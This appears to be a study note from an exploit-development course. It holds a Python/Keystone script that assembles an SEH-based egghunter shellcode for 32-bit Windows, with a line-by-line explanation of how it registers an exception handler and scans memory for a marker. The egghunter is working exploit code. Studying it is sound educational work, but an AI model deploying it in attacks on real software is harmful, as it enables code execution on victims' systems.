```
from keystone import *

CODE = (
"	start: 									 "
		# jump to a negative call to dynamically 
		# obtain egghunter position
"		jmp get_seh_address 				;" 
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
"	is_egg: 								 "
		# push 0x02
"		push 0x02 							;" 
		# pop the value into ecx which will act 
		# as a counter
"		pop ecx 							;" 
		# mov memory address into edi
"		mov edi, ebx 						;" 
		# check for our signature, if the page is invalid we 
		# trigger an exception and jump to our exception_handler function
"		repe scasd 							;" 
		# if we didn't find signature, increase ebx 
		# and repeat
"		jnz loop_inc_one 					;"  
		# we found our signature and will jump to it
"		jmp edi 							;" 
"	loop_inc_page: 							 " 
		# if page is invalid the exception_handler will 
		# update eip to point here and we move to next page
"		or bx, 0xfff 						;" 
"	loop_inc_one: 							 "
		# increase ebx by one byte
"		inc ebx 							;" 
		# check for signature again
"		jmp is_egg 							;" 
"	get_seh_address: 						 "
		# call to a higher address to avoid null bytes & push 
		# return to obtain egghunter position
"		call build_exception_record 		;" 
		# push 0x0c onto the stack
"		push 0x0c 							;" 
		# pop the value into ecx
"		pop ecx 							;" 
		# mov into eax the pointer to the CONTEXT 
		# structure for our exception
"		mov eax, [esp+ecx] 					;" 
		# mov 0xb8 into ecx which will act as an 
		# offset to the eip
"		mov cl, 0xb8						;" 
		# increase the value of eip by 0x06 in our CONTEXT 
		# so it points to the "or bx, 0xfff" instruction 
		# to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;" 
		# save return value into eax
"		pop eax 							;" 
		# increase esp to clean the stack for our call
"		add esp, 0x10 						;" 
		# push return value back into the stack
"		push eax 							;" 
		# null out eax to simulate 
		# ExceptionContinueExecution return
"		xor eax, eax 						;" 
		# return
"		ret 								;" 
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("egghunter = (\"" + egghunter + "\")")
```

1. jmp down to get_seh_address: first, this allows us store an address to the stack and avoid null bytes with our relative call to build_exception_record:.
2. In build_exception_record:, we immediately pop off the return address and create the ERR struct (`_EXCEPTION_REGISTRATION_RECORD`) on the stack by pushing the return address on as 'Handler' and pushing -1 (as 0xffffffff) as 'Next'. We also move our egg string into eax for scasd.
3. Overwrite the ExceptionList member in TEB by zero'ing ebx (XOR) then `mov dword ptr fs:[ebx], esp` which moves the created ERR struct into TEB location of our first error handler.
4. See [[Egghunter Example]] for is_egg:, loop_inc_page:, and loop_inc_one implementations. We use `repe scasd` to compact our repeated dword string compare, where ecx (set to 2 here) serves as a counter for repe. https://www.felixcloutier.com/x86/scas:scasb:scasw:scasd
5. The return address we pushed as 'Handler' leads us back to get_seh_address in the case of an exception (due to the invalid read address). This section should restore execution back to loop_inc_page: to continue searching.
	1. The OS invokes `_except_handler` on exception (see "`_except_handler` prototype" in [[Exploiting SEH Overflows]]). The relevant parameter is ContextRecord (at offsec 0x0C) which contains EIP at time of exception (at offset 0xb8 within ContextRecord). 
	2. `push 0x0c` (0C to get the 3rd pointer parameter) and `pop ecx` then `mov eax, [esp+ecx]`, all to get the dereferenced value in eax. 
	3. `mov cl, 0xb8` and `add dword ptr ds:[eax+ecx], 0x06`:  to offset b8 into ContextRecord where eip is stored, and then add 06 to the eip value to point it 3 instructions ahead to loop_inc_page: (from `repe scasd` where the exception was triggered)
	4. `pop eax` (with the return address), `add esp 0x10` pushes the stack past the 4 `except_handler` parameters, `push eax` restore the return address on the stack. Then finally return value of 0 to `_except_handler` with `xor eax, eax` signaling 'ExceptionContinueExecution'